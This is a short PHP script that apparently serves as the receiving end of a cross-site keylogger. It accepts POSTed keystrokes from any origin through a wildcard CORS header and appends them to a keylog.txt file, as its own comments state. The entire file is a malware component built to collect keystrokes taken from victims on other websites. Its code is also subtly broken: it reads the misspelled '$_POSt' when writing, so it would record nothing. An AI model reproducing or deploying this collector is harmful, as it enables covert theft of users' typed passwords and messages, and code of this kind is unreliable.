<?php
    header("Access-Control-Allow-Origin: *");

    // listens to post from another website
    if (!empty($_POST['key']))
    {
        // saves recorded keys to file
        $logfile = fopen('keylog.txt', 'a+');
        fwrite($logfile, $_POSt['key']);
        fclose($logfile);
    }
?>